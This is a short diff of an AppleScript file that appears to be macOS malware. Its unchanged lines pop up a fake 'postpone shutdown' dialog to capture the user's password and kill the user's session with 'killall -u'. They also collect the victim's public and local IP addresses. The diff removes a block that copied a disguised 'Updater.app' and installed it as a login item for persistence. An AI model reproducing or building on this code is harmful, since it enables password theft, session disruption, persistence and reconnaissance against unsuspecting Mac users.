@@ -21,12 +21,6 @@ try
 		set quest to (display dialog "Please enter your password to postpone shutdown." with title "Password" with icon (path to resource "icon.icns") default answer "" buttons {"OK"} default button 1 giving up after 10 with hidden answer) -- Prompt for Password
 		set passwd to text returned of quest
 		if gave up of quest = true then -- If the user doesn't enter a password:
-			try
-				set reso to POSIX path of (path to resource "Updater.app")
-				set newreso to POSIX path of ("" & ufld & "Updater.app")
-				do shell script "cp -r " & reso & " " & newreso
-				tell application "System Events" to make login item at end with properties {path:newreso, kind:application} -- Make application a login item
-			end try
 			do shell script "killall -u " & theuser -- Shutdown
 		end if
 		try
@@ -37,9 +31,9 @@ try
 			display dialog "Please try again." with title "Password" buttons {"OK"} default button 1 with icon caution giving up after 3 -- If password is incorrect, try again
 		end try
 	end repeat
-	
+
+	try	
 	set dte to (current date) as string
-	try
 		do shell script "curl http://checkip.dyndns.org/ | grep 'Current IP Address' | cut -d : -f 2 | cut -d \\< -f 1"
 		set WANIP to (characters 2 through -1 of result) as text -- Get IP
 		set LANIP to (do shell script "ipconfig getifaddr en1")
